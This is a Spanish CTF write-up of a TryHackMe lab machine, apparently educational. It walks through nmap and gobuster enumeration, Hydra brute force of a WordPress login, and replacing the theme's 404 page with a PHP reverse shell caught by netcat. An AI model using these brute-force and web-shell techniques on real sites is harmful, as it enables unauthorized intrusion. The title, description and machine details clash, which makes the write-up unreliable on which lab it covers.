# Resolución de la Máquina: Bounty Hacker

- **Plataforma:** TryHackMe
- **Dificultad:** Medio
- **Fecha de resolución:** 25/06/2025
- **Sistema Operativo:** Linux


## Descripción

RootMe es una máquina de nivel introductorio diseñada para enseñar conceptos básicos de enumeración web,
explotación remota y escalada de privilegios en sistemas Linux. Es ideal para principiantes que buscan familiarizarse con el flujo típico de un ataque en entornos CTF.

Esta máquina es especialmente útil para:

> Enumeración de servicios expuestos

> Explotación de vulnerabilidades web (RCE)

> Ganancia de acceso inicial (low privilege shell)

> Escalada de privilegios mediante binarios SUID mal configurados

## Enumeración

### Escaneo con Nmap

```bash
─$ nmap --open -sS -T5 -n -sV -Pn 10.10.39.168 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 18:34 CEST
Nmap scan report for 10.10.39.168
Host is up (0.092s latency).
Not shown: 997 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.39 seconds
```
### Escaneo con gobuster

```bash
└─$ gobuster dir -u http://10.10.39.168/ -w /usr/share/wordlists/wfuzz/general/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.39.168/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/wfuzz/general/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots               (Status: 200) [Size: 41]
/admin                (Status: 301) [Size: 234] [--> http://10.10.39.168/admin/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.39.168/blog/]
/css                  (Status: 301) [Size: 232] [--> http://10.10.39.168/css/]
/images               (Status: 301) [Size: 235] [--> http://10.10.39.168/images/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.39.168/js/]
/intro                (Status: 200) [Size: 516314]
/login                (Status: 302) [Size: 0] [--> http://10.10.39.168/wp-login.php]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.39.168/feed/]
/sitemap              (Status: 200) [Size: 0]
/xmlrpc               (Status: 405) [Size: 42]
Progress: 952 / 953 (99.90%)
===============================================================
Finished
===============================================================
```
En robots.txt encontraremos un diccionario junto a la primera flag, para visualizarlo lo haremos como si de un sitio web más se tratase.
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
Con un wget nos descargaremos este diccionario, lo limpiaremos debido a que hay muchas lineas repetidas.
```bash
wget http://10.10.196.195/fsocity.dic
sort -u archivo.txt > archivo_sin_repetidos.txt
```
Haremos un ataque de fuerza bruta con hydra únicamnete hacia el usuario, veremos que si el usuario existe el codigo de error es diferente y nos lo detecta.
Los parámetros del forumalario los podemos verificar enviando la petición de login hacia burpsuite.
```bash
└─$ hydra -I -L fsocity_clean.dic -p x 10.10.196.195 https-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submitLog%20In&testcookie=1:F=Invalid username" -t30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizatins, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-25 23:02:24
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries (l:11452/p:1), ~382 tries per task
[DATA] attacking http-post-forms://10.10.196.195:443/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log%20In&testcooke=1:F=Invalid username
[STATUS] 1365.00 tries/min, 1365 tries in 00:01h, 10087 to do in 00:08h, 30 active
[STATUS] 1106.33 tries/min, 3319 tries in 00:03h, 8133 to do in 00:08h, 30 active
[443][http-post-form] host: 10.10.196.195   login: Elliot   password: x
[443][http-post-form] host: 10.10.196.195   login: elliot   password: x
[443][http-post-form] host: 10.10.196.195   login: ELLIOT   password: x
[STATUS] 1028.86 tries/min, 7202 tries in 00:07h, 4250 to do in 00:05h, 30 active

```
Una vez detectado el usuario Eliot procederemos a lanzar el ataque de fuerza bruta contra la contraseña, hemos de tener en cuenta el campo F que detectara si las contraseñas probadas son incorrectas 
```bash
└─$ hydra -I -l ELLIOT -P fsocity_clean.dic 10.10.170.170 https-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submitLog%20In&testcookie=1:F=is incorrect" -t30                             
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-29 16:00:37
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries (l:1/p:11452), ~382 tries per task
[DATA] attacking http-post-forms://10.10.170.170:443/wp-login.php:log=^USER^&pwd=^PASS^&wp-submitLog%20In&testcookie=1:F=is incorrect

[STATUS] 2322.00 tries/min, 2322 tries in 00:01h, 9130 to do in 00:04h, 30 active
[443][http-post-form] host: 10.10.170.170   login: ELLIOT   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-29 16:03:07
```
Desde Apparece > Editor modificaremos la página que se muestra en caso de no encontrar la página por una reverse shell en PHP (www.revshells.com)
Ahora solo hara falta ponernos en escucha con netcat y haremos que cargue la página de error 404.
Aqui encontraremos el segundo flag.
```bash
└─$ nc -lnvp 4444    
listening on [any] 4444 ...
connect to [10.9.1.252] from (UNKNOWN) [10.10.51.184] 45458
Linux ip-10-10-51-184 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 16:28:05 up 9 min,  0 users,  load average: 0.49, 0.19, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
bash: cannot set terminal process group (5360): Inappropriate ioctl for device
bash: no job control in this shell
daemon@ip-10-10-51-184:/$ 
```
